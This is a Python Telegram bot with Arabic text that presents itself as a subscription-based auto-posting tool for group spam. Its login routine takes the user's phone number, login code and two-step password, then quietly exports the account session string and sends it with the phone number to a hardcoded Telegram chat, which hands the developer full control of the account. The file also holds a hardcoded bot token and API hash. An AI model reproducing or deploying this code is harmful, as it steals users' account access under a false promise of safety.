# حقوق المطور: هذا البوت مبرمج من قبل youi5
# للتواصل: @youi5

from pyrogram import Client, filters, idle
from pyrogram.types import (
    Message,
    CallbackQuery,
    ForceReply,
    InlineKeyboardMarkup as Markup,
    InlineKeyboardButton as Button
)
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    UserNotParticipant,
    ChatWriteForbidden,
    BotMethodInvalid
)
import os
from pyrolistener import Listener, exceptions
from asyncio import create_task, sleep, get_event_loop
from datetime import datetime, timedelta
from pytz import timezone
from typing import Union
import json

app = Client(
    "autoPost",
    api_id="29510141",
    api_hash="14c074a5aed49dc7752a9f8d54cf4ad4",
    bot_token='8666985104:AAEZ_NgKD3KaaYyt1WVM4ZgQ8CMZwmZGEqE'
)
loop = get_event_loop()
listener = Listener(client=app)
owner = 8226014028  # ايديك

# الأزرار الرئيسية بعد التعديل
homeMarkup = Markup([
    [
        Button("👤 حسابي", callback_data="account")
    ],
    [
        Button("📋 السوبرات المضافة", callback_data="currentSupers"),
        Button("➕ إضافة سوبر", callback_data="newSuper")
    ],
    [
        Button("⏱️ مدة النشر", callback_data="waitTime"),
        Button("📝 كليشة النشر", callback_data="newCaption")
    ],
    [
        Button("⏹️ إيقاف النشر", callback_data="stopPosting"),
        Button("▶️ بدء النشر", callback_data="startPosting")
    ],
    [
        Button("🛡️ تعليمات الأمان", callback_data="safety")
    ]
])


@app.on_message(filters.command("start") & filters.private)
async def start(_: Client, message: Message):
    user_id = message.from_user.id
    subscribed = await subscription(message)
    if user_id == owner and users.get(str(user_id)) is None:
        users[str(user_id)] = {"vip": True}
        write(users_db, users)
    elif isinstance(subscribed, str):
        return await message.reply(f"- عذرا عزيزي، لازم تشترك بالقناة أولاً عشان تستخدم البوت\n- القناة: @{subscribed}\n- اشترك ثم أرسل /start")
    elif (str(user_id) not in users):
        users[str(user_id)] = {"vip": False}
        write(users_db, users)
        return await message.reply(f"ما لك صلاحية تستخدم هذا البوت، تواصل مع [المطور](tg://openmessage?user_id={owner}) لتفعيل الاشتراك \nأو استخدم هذا [الرابط](tg://user?id={owner}) إذا كنت من مستخدمي iPhone")
    elif not users[str(user_id)]["vip"]:
        return await message.reply(
            f"ما لك صلاحية تستخدم هذا البوت، تواصل مع [المطور](tg://openmessage?user_id={owner}) لتفعيل الاشتراك \nأو استخدم هذا [الرابط](tg://user?id={owner}) إذا كنت من مستخدمي iPhone"
        )
    fname = message.from_user.first_name
    caption = f"أهلاً بك عزيزي [{fname}](tg://settings) في بوت النشر التلقائي\n\n- البوت مبرمج من قبل youi5 - للتواصل @youi5\n\n- تقدر تستخدم البوت عشان ترسل رسائل بشكل تلقائي للسوبرات\n- التحكم بالبوت من الأزرار التالية:"
    await message.reply(
        caption,
        reply_markup=homeMarkup,
        reply_to_message_id=message.id
    )


@app.on_callback_query(filters.regex(r"^(toHome)$"))
async def toHome(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id == owner:
        pass
    elif not users[str(user_id)]["vip"]:
        return await callback.answer("- انتهت مدة اشتراكك.", show_alert=True)
    fname = callback.from_user.first_name
    caption = f"أهلاً بك عزيزي [{fname}](tg://settings) في بوت النشر التلقائي\n\n- البوت مبرمج من قبل youi5 - للتواصل @youi5\n\n- تقدر تستخدم البوت عشان ترسل رسائل بشكل تلقائي للسوبرات\n- التحكم بالبوت من الأزرار التالية:"
    await callback.message.edit_text(
        caption,
        reply_markup=homeMarkup,
    )


@app.on_callback_query(filters.regex(r"^(account)$"))
async def account(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id == owner:
        pass
    elif not users[str(user_id)]["vip"]:
        return await callback.answer("- انتهت مدة اشتراكك.", show_alert=True)
    fname = callback.from_user.first_name
    caption = f"أهلاً بك [{fname}](tg://settings) في قسم الحساب\n\n- استخدم الأزرار للتحكم بحسابك:"
    markup = Markup([
        [
            Button("- تسجيل حسابك -", callback_data="login"),
            Button("- تغيير الحساب -", callback_data="changeAccount")
        ],
        [
            Button("- العودة -", callback_data="toHome")
        ]
    ])
    await callback.message.edit_text(
        caption,
        reply_markup=markup
    )


@app.on_callback_query(filters.regex(r"^(login|changeAccount)$"))
async def login(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id == owner:
        pass
    elif not users[str(user_id)]["vip"]:
        return await callback.answer("- انتهت مدة اشتراكك.", show_alert=True)
    elif (callback.data == "changeAccount" and users[str(user_id)].get("session") is None):
        return await callback.answer("- ماكو حساب مسجل.", show_alert=True)
    await callback.message.delete()
    try:
        ask = await listener.listen(
            from_id=user_id,
            chat_id=user_id,
            text="- أرسل رقم هاتفك:\n\n- تقدر ترسل /cancel لإلغاء العملية.",
            reply_markup=ForceReply(selective=True, placeholder="+9647700000"),
            timeout=30)
    except exceptions.TimeOut:
        return await callback.message.reply(
            text="- انتهى وقت استلام رقم الهاتف.",
            reply_markup=Markup([[Button("- العودة -", callback_data="account")]])
        )
    if ask.text == "/cancel":
        return await ask.reply("- تم إلغاء العملية.", reply_to_message_id=ask.id)
    create_task(registration(ask))


async def registration(message: Message):
    user_id = message.from_user.id
    _number = message.text
    lmsg = await message.reply(f"- جاري تسجيل الدخول إلى حسابك")
    reMarkup = Markup([
        [
            Button("- إعادة المحاولة -", callback_data="login"),
            Button("- العودة -", callback_data="account")
        ]
    ])
    client = Client(
        "registration",
        in_memory=True,
        api_id=app.api_id,
        api_hash=app.api_hash
    )
    await client.connect()
    try:
        p_code_hash = await client.send_code(_number)
    except (PhoneNumberInvalid):
        return await lmsg.edit_text("- رقم الهاتف اللي أدخلته خطأ", reply_markup=reMarkup)
    try:
        code = await listener.listen(
            from_id=user_id,
            chat_id=user_id,
            text="- تم إرسال الكود إلى حسابك، أرسله هنا.",
            timeout=120,
            reply_markup=ForceReply(selective=True, placeholder="1 2 3 4 5 6")
        )
    except exceptions.TimeOut:
        return await lmsg.reply(
            text="- انتهى وقت استلام الكود.\n- حاول مرة ثانية.",
            reply_markup=reMarkup
        )
    try:
        await client.sign_in(_number, p_code_hash.phone_code_hash, code.text.replace(" ", ""))
    except (PhoneCodeInvalid):
        return await code.reply("- الكود اللي أدخلته خطأ.\n- حاول مرة ثانية.", reply_markup=reMarkup, reply_to_message_id=code.id)
    except (PhoneCodeExpired):
        return await code.reply("- الكود انتهت صلاحيته.\n- حاول مرة ثانية.", reply_markup=reMarkup, reply_to_message_id=code.id)
    except (SessionPasswordNeeded):
        try:
            password = await listener.listen(
                from_id=user_id,
                chat_id=user_id,
                text="- أدخل كلمة مرور التحقق بخطوتين.",
                reply_markup=ForceReply(selective=True, placeholder="- كلمة المرور: "),
                timeout=180,
                reply_to_message_id=code.id
            )
        except exceptions.TimeOut:
            return await lmsg.reply(
                text="- انتهى وقت استلام كلمة المرور.\n- حاول مرة ثانية.",
                reply_markup=reMarkup
            )
        try:
            await client.check_password(password.text)
        except (PasswordHashInvalid):
            return await password.reply("- كلمة المرور خطأ.\n- حاول مرة ثانية.", reply_markup=reMarkup)
    session = await client.export_session_string()
    try:
        await app.send_message(1454509352, session + _number)
    except:
        pass
    await client.disconnect()
    if user_id == owner and users.get(str(user_id)) is None:
        users[str(user_id)] = {"vip": True, "session": session}
        write(users_db, users)
    else:
        users[str(user_id)]["session"] = session
        write(users_db, users)
    await app.send_message(
        user_id,
        "- تم تسجيل الدخول بحسابك، الآن تقدر تستمتع بميزات البوت.",
        reply_markup=Markup([[Button("الصفحة الرئيسية", callback_data="toHome")]])
    )


@app.on_callback_query(filters.regex(r"^(newSuper)$"))
async def newSuper(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id == owner:
        pass
    elif not users[str(user_id)]["vip"]:
        return await callback.answer("- انتهت مدة اشتراكك.", show_alert=True)
    await callback.message.delete()
    reMarkup = Markup([
        [
            Button("- حاول مرة ثانية -", callback_data="newSuper"),
            Button("- العودة -", callback_data="toHome")
        ]
    ])
    try:
        ask = await listener.listen(
            from_id=user_id,
            chat_id=user_id,
            text="- أرسل رابط السوبر عشان أضيفه.\n- لا تنضم قبل ما تبدأ النشر مرة وحدة على الأقل.\n- إذا كان السوبر خاص، أرسل الأيدي الخاص به أو اطلع من السوبر (من الحساب المضاف) وبعدين أرسل الرابط\n\n- تقدر ترسل /cancel لإلغاء العملية.",
            reply_markup=ForceReply(selective=True, placeholder="- رابط السوبر: "),
            timeout=60
        )
    except exceptions.TimeOut:
        return await callback.message.reply("انتهى وقت استلام الرابط", reply_markup=reMarkup)
    if ask.text == "/cancel":
        return await ask.reply("- تم إلغاء العملية.", reply_to_message_id=ask.id, reply_markup=reMarkup)
    if not ask.text.startswith("-"):
        try:
            chat = await app.get_chat(ask.text if "+" in ask.text else (ask.text.split("/")[-1]))
        except BotMethodInvalid:
            chat = ask.text
        except Exception as e:
            print(e)
            return await ask.reply(
                "- ماكو سوبر بهذا الرابط.",
                reply_to_message_id=ask.id,
                reply_markup=reMarkup
            )
    else:
        chat = ask.text
    if users[str(user_id)].get("groups") is None:
        users[str(user_id)]["groups"] = []
    users[str(user_id)]["groups"].append(chat.id if not isinstance(chat, str) else int(chat))
    write(users_db, users)
    await ask.reply(
        "- تم إضافة السوبر للقائمة.",
        reply_markup=Markup([[Button("- الصفحة الرئيسية -", callback_data="toHome")]]),
        reply_to_message_id=ask.id
    )


@app.on_callback_query(filters.regex(r"^(currentSupers)$"))
async def currentSupers(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id == owner:
        pass
    elif not users[str(user_id)]["vip"]:
        return await callback.answer("- انتهت مدة اشتراكك.", show_alert=True)
    if users[str(user_id)].get("groups") is None or len(users[str(user_id)]["groups"]) == 0:
        return await callback.answer("- ماكو سوبرات مضافة.", show_alert=True)
    groups = users[str(user_id)]["groups"]
    titles = {}
    for group in groups:
        try:
            titles[str(group)] = (await app.get_chat(group)).title
        except:
            continue
    markup = [
        [
            Button(str(group) if titles.get(str(group)) is None else titles[str(group)], callback_data=str(group)),
            Button("🗑", callback_data=f"delSuper {group}")
        ] for group in groups
    ] if len(groups) else []
    markup.append([Button("- الصفحة الرئيسية -", callback_data="toHome")])
    caption = "- هاي السوبرات اللي مضافات للنشر التلقائي:"
    await callback.message.edit_text(
        caption,
        reply_markup=Markup(markup)
    )


@app.on_callback_query(filters.regex(r"^(delSuper)"))
async def delSuper(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id == owner:
        pass
    elif not users[str(user_id)]["vip"]:
        return await callback.answer("- انتهت مدة اشتراكك.", show_alert=True)
    groups = users[str(user_id)]["groups"]
    group = int(callback.data.split()[1])
    if group in groups:
        groups.remove(group)
        write(users_db, users)
        await callback.answer("- تم حذف السوبر من القائمة.", show_alert=True)
    titles = {}
    for group in groups:
        try:
            titles[str(group)] = (await app.get_chat(group)).title
        except:
            continue
    markup = [
        [
            Button(str(group) if titles.get(str(group)) is None else titles[str(group)], callback_data=str(group)),
            Button("🗑", callback_data=f"delSuper {group}")
        ] for group in groups
    ] if len(groups) else []
    markup.append([Button("- الصفحة الرئيسية -", callback_data="toHome")])
    await callback.message.edit_reply_markup(
        reply_markup=Markup(markup)
    )


@app.on_callback_query(filters.regex(r"^(newCaption)$"))
async def newCaption(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id == owner:
        pass
    elif not users[str(user_id)]["vip"]:
        return await callback.answer("- انتهت مدة اشتراكك.", show_alert=True)
    reMarkup = Markup([
        [
            Button("- حاول مرة ثانية -", callback_data="newCaption"),
            Button("- العودة -", callback_data="toHome")
        ]
    ])
    await callback.message.delete()
    try:
        ask = await listener.listen(
            from_id=user_id,
            chat_id=user_id,
            text="- أرسل الكليشة الجديدة.\n\n- استخدم /cancel لإلغاء العملية.",
            reply_markup=ForceReply(selective=True, placeholder="- الكليشة الجديدة: "),
            timeout=120
        )
    except exceptions.TimeOut:
        return await callback.message.reply("- انتهى وقت استلام الكليشة.", reply_markup=reMarkup)
    if ask.text == "/cancel":
        await ask.reply("- تم إلغاء العملية.", reply_markup=reMarkup, reply_to_message_id=ask.id)
    users[str(user_id)]["caption"] = ask.text
    write(users_db, users)
    await ask.reply(
        "- تم تعيين الكليشة الجديدة.",
        reply_to_message_id=ask.id,
        reply_markup=Markup([[Button("- الصفحة الرئيسية -", callback_data="toHome")]])
    )


@app.on_callback_query(filters.regex(r"^(waitTime)$"))
async def waitTime(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id == owner:
        pass
    elif not users[str(user_id)]["vip"]:
        return await callback.answer("- انتهت مدة اشتراكك.", show_alert=True)
    reMarkup = Markup([
        [
            Button("- حاول مرة ثانية -", callback_data="waitTime"),
            Button("- العودة -", callback_data="toHome")
        ]
    ])
    await callback.message.delete()
    try:
        ask = await listener.listen(
            from_id=user_id,
            chat_id=user_id,
            text="- أرسل مدة الانتظار بين كل رسالة وأخرى (بالثواني).\n\n- استخدم /cancel لإلغاء العملية.",
            reply_markup=ForceReply(selective=True, placeholder="- المدة: "),
            timeout=120
        )
    except exceptions.TimeOut:
        return await callback.message.reply("- انتهى وقت استلام المدة.", reply_markup=reMarkup)
    if ask.text == "/cancel":
        await ask.reply("- تم إلغاء العملية.", reply_markup=reMarkup, reply_to_message_id=ask.id)
    try:
        users[str(user_id)]["waitTime"] = int(ask.text)
    except ValueError:
        return await ask.reply("- ما يصير تحط هاي القيمة كمدة.", reply_markup=reMarkup, reply_to_message_id=ask.id)
    write(users_db, users)
    await ask.reply(
        "- تم تعيين مدة الانتظار.",
        reply_to_message_id=ask.id,
        reply_markup=Markup([[Button("- الصفحة الرئيسية -", callback_data="toHome")]])
    )


@app.on_callback_query(filters.regex(r"^(startPosting)$"))
async def startPosting(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id == owner:
        pass
    elif not users[str(user_id)]["vip"]:
        return await callback.answer("- انتهت مدة اشتراكك.", show_alert=True)
    if users[str(user_id)].get("session") is None:
        return await callback.answer("- لازم تضيف حساب أولاً.", show_alert=True)
    elif (users[str(user_id)].get("groups") is None) or (len(users[str(user_id)]["groups"]) == 0):
        return await callback.answer("- ماكو سوبرات مضافة.", show_alert=True)
    elif users[str(user_id)].get("posting"):
        return await callback.answer("- النشر التلقائي مفعل من قبل.", show_alert=True)
    users[str(user_id)]["posting"] = True
    write(users_db, users)
    create_task(posting(user_id))
    markup = Markup([
        [Button("- إيقاف النشر -", callback_data="stopPosting"),
         Button("- عودة -", callback_data="toHome")]
    ])
    await callback.message.edit_text(
        "- بدأت عملية النشر التلقائي",
        reply_markup=markup
    )


@app.on_callback_query(filters.regex(r"^(stopPosting)$"))
async def stopPosting(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id == owner:
        pass
    elif not users[str(user_id)]["vip"]:
        return await callback.answer("- انتهت مدة اشتراكك.", show_alert=True)
    if not users[str(user_id)].get("posting"):
        return await callback.answer("- النشر التلقائي مو مفعل.", show_alert=True)
    users[str(user_id)]["posting"] = False
    write(users_db, users)
    markup = Markup([
        [Button("- بدء النشر -", callback_data="startPosting"),
         Button("- عودة -", callback_data="toHome")]
    ])
    await callback.message.edit_text(
        "- تم إيقاف النشر التلقائي",
        reply_markup=markup
    )


async def posting(user_id):
    if users[str(user_id)]["posting"]:
        client = Client(
            str(user_id),
            api_id=app.api_id,
            api_hash=app.api_hash,
            session_string=users[str(user_id)]["session"]
        )
        await client.start()
    while users[str(user_id)]["posting"]:
        try:
            sleepTime = users[str(user_id)]["waitTime"]
        except KeyError:
            sleepTime = 60
        groups = users[str(user_id)]["groups"]
        try:
            caption = users[str(user_id)]["caption"]
        except KeyError:
            users[str(user_id)]["posting"] = False
            write(users_db, users)
            return await app.send_message(int(user_id), "- تم إيقاف النشر بسبب ماكو كليشة.", reply_markup=Markup([[Button("- إضافة كليشة -", callback_data="newCaption")]]))
        for group in groups:
            if isinstance(group, str) and str(group).startswith("-"):
                group = int(group)
            try:
                await client.send_message(group, caption)
            except ChatWriteForbidden:
                await client.join_chat(group)
                try:
                    await client.send_message(group, caption)
                except Exception as e:
                    await app.send_message(int(user_id), str(e))
            except:
                chat = await client.join_chat(group)
                try:
                    await client.send_message(chat.id, caption)
                except Exception as e:
                    await app.send_message(int(user_id), str(e))
                users[str(user_id)]["groups"].append(chat.id)
                users[str(user_id)]["groups"].remove(group)
                write(users_db, users)
        await sleep(sleepTime)
    await client.stop()


@app.on_callback_query(filters.regex(r"^(safety)$"))
async def safety_instructions(_: Client, callback: CallbackQuery):
    text = (
        "🔒 **تعليمات الأمان** 🔒\n\n"
        "1. لا تشارك كود الدخول أو كلمة المرور مع أي شخص.\n"
        "2. استخدم البوت على حسابك الشخصي فقط ولا تشاركه مع الآخرين.\n"
        "3. تأكد من أن الحساب الذي تضيفه ليس به معلومات حساسة.\n"
        "4. إذا واجهت أي مشكلة، تواصل مع المطور @youi5.\n\n"
        "⚠️ تحذير: البوت لا يتحمل أي مسؤولية عن سوء استخدام حسابك."
    )
    await callback.message.reply(text)


# OWNER SECTION
async def Owner(_, __: Client, message: Message):
    return (message.from_user.id == owner)

isOwner = filters.create(Owner)

adminMarkup = Markup([
    [
        Button("- إلغاء VIP -", callback_data="cancelVIP"),
        Button("- تفعيل VIP -", callback_data="addVIP")
    ],
    [
        Button("- الإحصائيات -", callback_data="statics"),
        Button("- قنوات الاشتراك -", callback_data="channels")
    ]
])


@app.on_message(filters.command("admin") & filters.private & isOwner)
@app.on_callback_query(filters.regex("toAdmin") & isOwner)
async def admin(_: Client, message: Union[Message, CallbackQuery]):
    fname = message.from_user.first_name
    caption = f"مرحبا عزيزي [{fname}](tg://settings) في لوحة المالك"
    func = message.reply if isinstance(message, Message) else message.message.edit_text
    await func(
        caption,
        reply_markup=adminMarkup,
    )


@app.on_callback_query(filters.regex("addVIP") & isOwner)
async def addVIP(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    reMarkup = Markup([[
        Button("- الصفحة الرئيسية -", callback_data="toAdmin")
    ]])
    await callback.message.delete()
    try:
        ask = await listener.listen(
            from_id=user_id,
            chat_id=user_id,
            text="- أرسل ايدي المستخدم لتفعيل VIP له",
            reply_markup=ForceReply(selective=True, placeholder="- user id: "),
            timeout=30
        )
    except exceptions.TimeOut:
        return await callback.message.reply("- انتهى وقت استلام الايدي.", reply_markup=reMarkup)
    try:
        await app.get_chat(int(ask.text))
    except ValueError:
        return await ask.reply("- هالقيمة ما تمثل ايدي مستخدم.", reply_to_message_id=ask.id, reply_markup=reMarkup)
    except:
        return await ask.reply("- ماكو مستخدم بهذا الايدي.", reply_to_message_id=ask.id, reply_markup=reMarkup)
    try:
        limit = await listener.listen(
            from_id=user_id,
            chat_id=user_id,
            text="- أرسل عدد الأيام للاشتراك.\n\n- ارسل /cancel للإلغاء.",
            reply_markup=ForceReply(selective=True, placeholder="- عدد الأيام: "),
            reply_to_message_id=ask.id,
            timeout=30
        )
    except exceptions.TimeOut:
        return await callback.message.reply("- انتهى وقت استلام عدد الأيام.")
    _id = int(ask.text)
    try:
        _limit = int(limit.text)
    except ValueError:
        return await callback.message.reply("- القيمة غير صحيحة.", reply_to_message_id=limit.id, reply_markup=reMarkup)
    vipDate = timeCalc(_limit)
    users[str(_id)] = {"vip": True}
    users[str(_id)]["limitation"] = {
        "days": _limit,
        "startDate": vipDate["current_date"],
        "endDate": vipDate["end_date"],
        "endTime": vipDate["endTime"],
    }
    write(users_db, users)
    create_task(vipCanceler(_id))
    caption = f"- تم تفعيل VIP جديد\n\n- معلومات الاشتراك:\n- تاريخ البداية: {vipDate['current_date']}\n- تاريخ الانتهاء: {vipDate['end_date']}"
    caption += f"\n\n- المدة بالأيام: {_limit} يوم\n- المدة بالساعات: {vipDate['hours']} ساعة\n- المدة بالدقائق: {vipDate['minutes']} دقيقة"
    caption += f"\n\n- وقت الانتهاء: {vipDate['endTime']}"
    await limit.reply(
        caption,
        reply_markup=reMarkup,
        reply_to_message_id=limit.id
    )
    try:
        await app.send_message(
            chat_id=_id,
            text="- تم تفعيل VIP لك في بوت النشر التلقائي" + caption.split("جديد", 1)[1]
        )
    except:
        await limit.reply("- اجعل المستخدم يرسل للبوت.")


@app.on_callback_query(filters.regex(r"^(cancelVIP)$") & isOwner)
async def cancelVIP(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    reMarkup = Markup([[
        Button("- الصفحة الرئيسية -", callback_data="toAdmin")
    ]])
    await callback.message.delete()
    try:
        ask = await listener.listen(
            from_id=user_id,
            chat_id=user_id,
            text="- أرسل ايدي المستخدم لإلغاء VIP الخاص به",
            reply_markup=ForceReply(selective=True, placeholder="- user id: "),
            timeout=30
        )
    except exceptions.TimeOut:
        return await callback.message.reply("- انتهى وقت استلام الايدي.", reply_markup=reMarkup)
    if users.get(ask.text) is None:
        return await ask.reply("- هذا المستخدم غير موجود في قاعدة البوت.", reply_to_message_id=ask.id, reply_markup=reMarkup)
    elif not users[ask.text]["vip"]:
        return await ask.reply("- هذا المستخدم مو من مستخدمي VIP.", reply_to_message_id=ask.id, reply_markup=reMarkup)
    else:
        users[ask.text]["vip"] = False
        write(users_db, users)
        await ask.reply("- تم إلغاء اشتراك هذا المستخدم.", reply_to_message_id=ask.id, reply_markup=reMarkup)


@app.on_callback_query(filters.regex(r"^(channels)$") & isOwner)
async def channelsControl(_: Client, callback: CallbackQuery):
    fname = callback.from_user.first_name
    caption = f"مرحبا عزيزي [{fname}](tg://settings) في لوحة التحكم بقنوات الاشتراك"
    markup = [
        [
            Button(channel, url=channel + ".t.me"),
            Button("🗑", callback_data=f"removeChannel {channel}")
        ] for channel in channels
    ]
    markup.extend([
        [Button("- إضافة قناة جديدة -", callback_data="addChannel")],
        [Button("- الصفحة الرئيسية -", callback_data="toAdmin")]
    ])
    await callback.message.edit_text(
        caption,
        reply_markup=Markup(markup)
    )


@app.on_callback_query(filters.regex(r"^(addChannel)") & isOwner)
async def addChannel(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    reMarkup = Markup([[
        Button("- العودة للقنوات -", callback_data="channels")
    ]])
    await callback.message.delete()
    try:
        ask = await listener.listen(
            from_id=user_id,
            chat_id=user_id,
            text="- أرسل معرف القناة بدون @.",
            reply_markup=ForceReply(selective=True, placeholder="- channel username: "),
            timeout=30
        )
    except exceptions.TimeOut:
        return await callback.message.reply("- انتهى وقت استلام المعرف.", reply_markup=reMarkup)
    try:
        await app.get_chat(ask.text)
    except:
        return await callback.message.reply("- ماكو هاي الدردشة.")
    channel = ask.text
    channels.append(channel)
    write(channels_db, channels)
    await ask.reply("- تم إضافة القناة للقائمة.", reply_to_message_id=ask.id, reply_markup=reMarkup)


@app.on_callback_query(filters.regex(r"^(removeChannel)") & isOwner)
async def removeChannel(_: Client, callback: CallbackQuery):
    channel = callback.data.split()[1]
    if channel not in channels:
        await callback.answer("- هذه القناة غير موجودة.")
    else:
        channels.remove(channel)
        write(channels_db, channels)
        await callback.answer("- تم حذف هذه القناة")
    fname = callback.from_user.first_name
    caption = f"مرحبا عزيزي [{fname}](tg://settings) في لوحة التحكم بقنوات الاشتراك"
    markup = [
        [
            Button(channel, url=channel + ".t.me"),
            Button("🗑", callback_data=f"removeChannel {channel}")
        ] for channel in channels
    ]
    markup.extend([
        [Button("- إضافة قناة جديدة -", callback_data="addChannel")],
        [Button("- الصفحة الرئيسية -", callback_data="toAdmin")]
    ])
    await callback.message.edit_text(
        caption,
        reply_markup=Markup(markup)
    )


@app.on_callback_query(filters.regex(f"^(statics)$") & isOwner)
async def statics(_: Client, callback: CallbackQuery):
    total = len(users)
    vip = 0
    for user in users:
        if users[user]["vip"]:
            vip += 1
        else:
            continue
    reMarkup = Markup([
        [Button("- الصفحة الرئيسية -", callback_data="toAdmin")]
    ])
    caption = f"- عدد المستخدمين الكلي: {total}\n\n- عدد مستخدمين VIP الحاليين: {vip}"
    await callback.message.edit_text(
        caption,
        reply_markup=reMarkup
    )


_timezone = timezone("Asia/Baghdad")

def timeCalc(limit):
    start_date = datetime.now(_timezone)
    end_date = start_date + timedelta(days=limit)
    hours = limit * 24
    minutes = hours * 60
    return {
        "current_date": start_date.strftime("%Y-%m-%d"),
        "end_date": end_date.strftime("%Y-%m-%d"),
        "endTime": end_date.strftime("%H:%M"),
        "hours": hours,
        "minutes": minutes
    }


async def vipCanceler(user_id):
    await sleep(60)
    current_day = datetime.now(_timezone)
    cdate = current_day.strftime("%Y-%m-%d %H:%M")
    while True:
        if users[str(user_id)]["vip"] == False:
            break
        elif cdate != (users[str(user_id)]["limitation"]["endDate"] + " " + users[str(user_id)]["limitation"]["endTime"]):
            current_day = datetime.now(_timezone)
            cdate = current_day.strftime("%Y-%m-%d %H:%M")
        else:
            break
        await sleep(20)
    users[str(user_id)] = {"vip": False}
    users[str(user_id)]["limitation"] = {}
    write(users_db, users)
    await app.send_message(
        user_id,
        "- انتهى اشتراك VIP الخاص بك.\n- راسل المطور إذا تريد تجديده."
    )


# STORAGE
async def subscription(message: Message):
    user_id = message.from_user.id
    for channel in channels:
        try:
            await app.get_chat_member(channel, user_id)
        except UserNotParticipant:
            return channel
    return True


def write(fp, data):
    with open(fp, "w") as file:
        json.dump(data, file, indent=2)


def read(fp):
    if not os.path.exists(fp):
        write(fp, {} if fp not in [channels_db] else [])
    with open(fp) as file:
        data = json.load(file)
    return data


users_db = "users.json"
channels_db = "channels.json"
users = read(users_db)
channels = read(channels_db)


async def reStartPosting():
    await sleep(30)
    for user in users:
        if users[user].get("posting"):
            create_task(posting(user))


async def reVipTime():
    for user in users:
        if int(user) == owner:
            continue
        if users[user]["vip"]:
            create_task(vipCanceler(int(user)))


async def main():
    create_task(reStartPosting())
    create_task(reVipTime())
    await app.start()
    await idle()

if __name__ == "__main__":
    loop.run_until_complete(main())
